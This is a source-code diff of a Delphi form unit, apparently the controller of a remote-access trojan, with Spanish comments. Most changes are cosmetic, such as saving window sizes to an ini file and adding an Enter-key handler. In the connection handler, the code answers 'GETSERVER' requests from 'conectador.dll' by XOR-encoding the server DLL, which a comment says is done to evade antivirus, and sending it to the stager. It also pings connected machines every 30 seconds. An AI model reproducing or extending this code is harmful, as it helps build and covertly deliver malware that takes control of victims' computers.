@@ -123,17 +123,19 @@ type
       Column: TListColumn; Point: TPoint);
     procedure PopupMenuConexionesPopup(Sender: TObject);
     procedure GloboEmergente(titulo:string;mensaje:string;tipo:cardinal);
+    procedure ListViewConexionesKeyPress(Sender: TObject; var Key: Char);
   private
     ColumnaOrdenada, Columna: integer;
     //Para saber por que columna está ordenado el listviewconexiones
     TrayIconData: TNotifyIconData;
-    //El record donde se guarda la información del icono de la tray
+    //El record dodne se guarda la información del icono de la tray
     procedure OnPopMessage(var Msg: TMessage); message WM_POP_MESSAGE;
     procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
     procedure NotiMsnDesconect(tItem: TListItem);
   public
     Columnas : array[0..8] of string; //Para saber el orden de las columnas
     NotificandoOnline: Boolean; //Si estamos notificando alguna conexión
+    ControlWidth, ControlHeight : integer; //Anchura y altura de FormControl para guardar al archivo ini
     procedure FormCloseQuery(Sender: TObject; var CanClose: boolean);
     procedure FormCloseQueryMinimizarAlTray(Sender: TObject; var CanClose: boolean);
     procedure MinimizeToTrayClick(Sender: TObject);
@@ -346,15 +348,14 @@ begin
   end;
   Len := Length(Buffer);
 
-  {if Buffer = 'CONNECTED?' then
+  if Buffer = 'CONNECTED?' then
     Exit  //Lo ignoramos
-  else if Buffer = 'PING' then}
-	if Buffer = 'PING' then
+  else if Buffer = 'PING' then
   begin
     Athread.Connection.WriteLn('PONG');
   end
-    else if Copy(Buffer, 1, 9) = 'GETSERVER' then //conectador.dll nos está pidiendo el servidor
-  begin                          //GETSERVER|clavecifrado1|clavecifrado2|
+    else if Copy(Buffer, 1, 9) = 'GETSERVER' then         //conectador.dll nos está pidiendo el servidor
+  begin                           //GETSERVER|clavecifrado1|clavecifrado2|
    Recibido := buffer;
    Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el GETSERVER|
 
@@ -368,7 +369,8 @@ begin
     for i := 1 to length(ServDLL) do
       TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses
 
-     Athread.Connection.Write(#14+inttostr(length(TmpServDLL))+#14+TmpServDLL);
+
+    Athread.Connection.Write(#14+inttostr(length(TmpServDLL))+#14+TmpServDLL);
   end
   else if Copy(Buffer, 1, 4) = 'PONG' then
   begin
@@ -514,7 +516,6 @@ begin
   begin
     Athread := TIdPeerThread(ListViewConexiones.Selected.SubItems.Objects[0]);
     NuevaVentanaControl := TFormControl.Create(self, Athread);
-    NuevaVentanaControl.PageControl.ActivePage := NuevaVentanaControl.TabServidor;
     ListViewConexiones.Selected.SubItems.Objects[1] := NuevaVentanaControl;
     if(buscaridcolumnapornombre(Columnas[1]) <> -1) then
     begin
@@ -678,10 +679,10 @@ begin
           c.width := Ini.ReadInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',100);
        end;
     end;
-
     self.Width := Ini.ReadInteger('AparienciaCliente', 'FormMainWidth',self.Width);
     self.Height := Ini.ReadInteger('AparienciaCliente', 'FormMainHeight',self.Height);
-
+    ControlWidth := Ini.ReadInteger('AparienciaCliente', 'FormControlWidth',ControlWidth);
+    ControlHeight := Ini.ReadInteger('AparienciaCliente', 'FormControlHeight',ControlHeight);
   finally
     Ini.Free;
   end;
@@ -771,8 +772,8 @@ begin
     Ini.WriteString('AparienciaCliente', 'ColumnaNombre8', Columnas[8]);
     Ini.WriteInteger('AparienciaCliente', 'FormMainHeight',self.Height);
     Ini.WriteInteger('AparienciaCliente', 'FormMainWidth',self.Width);
-
-
+    Ini.WriteInteger('AparienciaCliente', 'FormControlHeight',ControlHeight);
+    Ini.WriteInteger('AparienciaCliente', 'FormControlWidth',ControlWidth);
   finally
     Ini.Free;
   end;
@@ -933,6 +934,7 @@ var
   i:integer;
   AThread: TIdPeerThread;
 begin //Mandar Ping cada 30 segundos
+
   for i:=0 to listviewconexiones.Items.Count-1 do
   begin
     if((ListViewConexiones.items[i].SubItems[buscaridcolumnapornombre(Columnas[5])] <> '.') and (ListViewConexiones.items[i].SubItems.Objects[0] <> nil) ) then //solo si no estamos mandando ping
@@ -948,7 +950,7 @@ end;
 procedure TFormMain.ListViewConexionesColumnRightClick(Sender: TObject;
   Column: TListColumn; Point: TPoint);
 begin
-FormColumnasManager.show;
+  FormColumnasManager.show;
 end;
 
 procedure TFormMain.PopupMenuConexionesPopup(Sender: TObject);
@@ -956,6 +958,12 @@ begin
   if FormColumnasManager.Showing then
     FormColumnasManager.FocusControl(nil);
 
+end;
+
+procedure TFormMain.ListViewConexionesKeyPress(Sender: TObject;
+  var Key: Char);
+begin
+  if key=#13 then Abrir1.Click;
 end;
 
 end.
